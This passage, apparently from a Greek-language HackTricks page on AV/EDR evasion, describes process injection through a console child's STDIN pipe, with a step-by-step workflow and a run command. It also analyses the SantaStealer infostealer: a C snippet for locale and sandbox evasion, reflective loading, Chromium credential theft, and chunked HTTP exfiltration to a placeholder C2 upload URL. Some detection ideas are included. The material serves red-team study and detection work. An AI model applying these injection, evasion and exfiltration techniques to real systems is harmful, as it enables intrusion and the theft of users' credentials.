Έπειτα, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε εκχώρηση `PAGE_READWRITE`, να αλλάξει η προστασία της σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να γίνει άλμα σε αυτό, αποφεύγοντας μια απευθείας εκχώρηση RWX.

### Ιδέες για ανίχνευση

Οι συγγραφείς αναφέρουν τις εξής ευκαιρίες για αποτελεσματική αναζήτηση:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν εκτελέσιμες τις σελίδες παραμέτρων διεργασίας
- αυτή η αλλαγή προστασίας να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και έπειτα του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας για τα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του πλήρης primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων σε εκτελέσιμα και μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Έγχυση μέσω pipe STDIN κονσόλας

Μια διαδραστική θυγατρική διεργασία κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο της θυγατρικής διεργασίας σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στην ιδιωτική μνήμη του, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα νήμα της θυγατρικής διεργασίας σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά πρόκειται και πάλι για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονόμησης και προεπιλεγμένο security descriptor, τοποθετεί το read handle στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί μια νέα θυγατρική διεργασία με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το εκτελέσιμο κονσόλας που του παρέχεται· δεν συνδέει το pipe του σε υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την εξής ακολουθία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` της θυγατρικής διεργασίας. Απενεργοποιεί την κληρονόμηση στα δύο handles της γονικής πλευράς και κλείνει στη γονική διεργασία τα αντίγραφα των handles της θυγατρικής πλευράς μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Η θυγατρική διεργασία κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με `WriteFile` μέσω του handle `STDIN` της γονικής πλευράς. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφο σε μία από τις ιδιωτικές δεσμευμένες περιοχές μνήμης του.
4. Διατρέχει τον χώρο διευθύνσεων της θυγατρικής διεργασίας με το `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με το `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει την προστασία του εντοπισμένου buffer σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο νήμα, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με το `NtSetContextThread` και το επανεκκινεί.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με marker 25 byte, επομένως τα εκτελέσιμα byte αρχίζουν στη δεκαεξαδική μετατόπιση `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε μαζί το marker, το search vector, το μέγεθος του array και το execution offset. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως bad characters. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια της child process.<sup>[[41]](#references)</sup>

Για μικρά native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Tradecraft του SantaStealer για Fileless Evasion και Κλοπή Διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου & καθυστέρηση sandbox

- Μια σημαία διαμόρφωσης (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί διάταξη κυριλλικού αλφαβήτου, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει τους stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, ενώ αφήνει ένα τεκμήριο για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαδοχική λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει ένα προσαρμοσμένο rolling checksum για κάθε όνομα και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes. Επαναλαμβάνει τον υπολογισμό για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες του συστήματος (ελάχιστο πλήθος διεργασιών, πρόσφατο uptime), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει τα VirtualBox additions και εκτελεί χρονικούς ελέγχους γύρω από αναμονές για να εντοπίσει single-stepping. Κάθε θετικό εύρημα ακυρώνει την εκτέλεση πριν ξεκινήσουν τα modules.

### Fileless helper + διπλή reflective φόρτωση ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται χειροκίνητα map στη μνήμη. Σε fileless λειτουργία, επιλύει μόνο του τα imports/relocations, ώστε να μην αποθηκεύονται αρχεία του helper.
- Το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonces 12 byte). Μετά και τα δύο περάσματα, φορτώνει το blob με reflective τρόπο (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν inject σε ενεργό Chromium browser, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Modular συλλογή στη μνήμη & τμηματοποιημένη εξαγωγή μέσω HTTP

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και ξεκινά ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, browser extensions κ.λπ.). Κάθε thread εγγράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό των αρχείων του μετά από αναμονή join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, τα πάντα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στη διεύθυνση `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Σε κάθε τμήμα προστίθενται τα `User-Agent: upload`, `auth: <build_id>` και, προαιρετικά, `w: <campaign_tag>`. Στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ιστολόγιο](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις δωρεάν διευκολύνσεις για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC πλαστογράφησης call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων στάσης ασφαλείας του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερεύνηση προηγούμενων επιχειρήσεων ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό κέλυφος του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την αγνή βιτρίνα: Από RAT σε builder και έπειτα σε coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένας νέος, φιλόδοξος infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Ωραία κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Ωραία κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Οπλοποίηση του remediation driver του Defender ως primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με χρήση LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole του TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατεύθυνση εισόδου και εξόδου](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
